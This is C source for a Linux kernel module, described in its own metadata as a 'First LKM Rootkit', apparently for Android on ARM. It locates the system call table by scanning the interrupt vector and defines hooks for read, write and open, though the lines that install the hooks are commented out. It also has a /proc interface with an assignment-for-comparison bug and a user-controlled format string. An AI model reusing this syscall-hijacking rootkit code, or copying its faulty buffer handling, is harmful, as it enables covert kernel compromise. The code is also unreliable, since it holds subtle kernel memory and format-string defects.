#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/proc_fs.h>
#include <asm/uaccess.h>


#define AUTHOR "Gavin"
#define DESCRIPTION "First LKM Rootkit"
#define VERMAGIC_STRING "looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooog"


MODULE_LICENSE("GPL");
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);
//MODULE_INFO(vermagic, VERMAGIC_STRING);

#define __NR_GETUID 199
#define __NR_WRITEV 146
#define __NR_KILL 37
#define __NR_GETDENTS64 217

#define __NR_INIT_MOD 128
#define __NR_UNLINK 10
#define __NR_DEL_MOD 129
#define __NR_EXECVE 11
#define __NR_MKDIR 39
#define __NR_RMDIR 40
#define __NR_READ 3
#define __NR_WRITE 4
#define __NR_OPEN 5
#define __NR_CLOSE 6
#define __NR_CREAT 8
#define __NR_STAT 18

/*must be defined because of syscall macro used below*/
int errno;

static void **sys_call_table;
static unsigned long sys_call_table_size;

#define STRINGLEN 1024
char global_buffer[STRINGLEN];
struct proc_dir_entry *example_dir, *hello_file;

asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*orig_open) (const char *pathname, int flags);

/* 
 * Get the address of sys_call_table as a pointer. 
 * All further references are through indexing this pointer 
 */

static void* find_sys_call_table (void)
{
	//Interrupt tables are loaded in high memory in android starting at 0xffff0000
	void *swi_addr = (long *)0xffff0008;
	unsigned long offset = 0;
	unsigned long *vector_swi_addr = 0;

	offset = ((*(long *)swi_addr) & 0xfff) + 8;
	vector_swi_addr = *(unsigned long **)(swi_addr + offset);
	
	while ( vector_swi_addr++ )
	{
		// Copy the entire sys_call_table from the offset_from_swi_vector_adr starting the hardware interrupt table
		if( ((*(unsigned long *)vector_swi_addr) & 0xfffff000) == 0xe28f8000 )
        {
			offset = ((*(unsigned long *)vector_swi_addr) & 0xfff) + 8;
			return (void *)vector_swi_addr + offset;
		}
	}

	return NULL;
}

static unsigned long find_sys_call_table_size (void)
{
	void *swi_addr = (long *)0xffff0008;
	unsigned long offset, *vector_swi_addr;

	offset = ((*(long *)swi_addr) & 0xfff) + 8;
	vector_swi_addr = *(unsigned long **)(swi_addr + offset);

	while(vector_swi_addr++)
	{
		if(((*(unsigned long *)vector_swi_addr) & 0xffff0000)==0xe3570000)
		{
			unsigned long i=0x10-(((*(unsigned long *)vector_swi_addr) & 0xff00)>>8);
			unsigned long size=((*(unsigned long *)vector_swi_addr) & 0xff)<<(2*i);
			return size;
		}
	}
	return NULL;
}

static ssize_t check_buf(const char *buf)
{
	return 1;
}


asmlinkage ssize_t hacked_read (int fd, char *buf, size_t count)
{

	if(check_buf(buf))
	{
		printk ("SYS_READ: %02x\n", *buf);
	}
	return orig_read(fd, buf, count);
}

asmlinkage ssize_t hacked_write (int fd, char *buf, size_t count)
{

   	if(check_buf(buf))
	{
   		printk ("SYS_WRITE: %02x\n", *buf);		
	}
    return orig_write(fd, buf, count);
}

asmlinkage ssize_t hacked_open(const char *pathname, int flags) 
{
	printk("SYS_OPEN: %s\n", pathname);
	return orig_open(pathname, flags);
}

int proc_read_hello(char *page, char **start, off_t off, int count, int *eof, void *data) 
{
        int len;
        len = sprintf(page, global_buffer); //把global_buffer的内容显示给访问者
        return len;
}
int proc_write_hello(struct file *file, const char *buffer, unsigned long count, void *data)
{
        int len;
        if (count = STRINGLEN)
        	len = STRINGLEN - 1;
        else
        	len = count;
        /*
         * copy_from_user函数将数据从用户空间拷贝到内核空间
         * 此处将用户写入的数据存入global_buffer
         */
        copy_from_user(global_buffer, buffer, len);
        global_buffer[len] = '\0';
        return len;
}

static int init_rk(void)
{
	printk("Hello, Rootkit\n");
	sys_call_table = find_sys_call_table();
	sys_call_table_size = find_sys_call_table_size();

	printk("Get System Call table : %p\n", sys_call_table);
	printk("Get System Call table size : %lu\n",sys_call_table_size);

/*	orig_read = sys_call_table[__NR_READ];
	orig_write = sys_call_table[__NR_WRITE];
	orig_open = sys_call_table[__NR_OPEN];

	sys_call_table[__NR_READ] = hacked_read;
	sys_call_table[__NR_WRITE] = hacked_write;
	sys_call_table[__NR_OPEN] = hacked_open;*/

	example_dir = proc_mkdir("proc_test", NULL);
   	hello_file = create_proc_entry("hello", S_IRUGO, example_dir);
    strcpy(global_buffer, "hello");
    hello_file->read_proc = proc_read_hello;
    hello_file->write_proc = proc_write_hello;

	return 0;
}

static void exit_rk(void)
{
	printk("Bye, Rootkit\n");
}

module_init(init_rk);
module_exit(exit_rk);
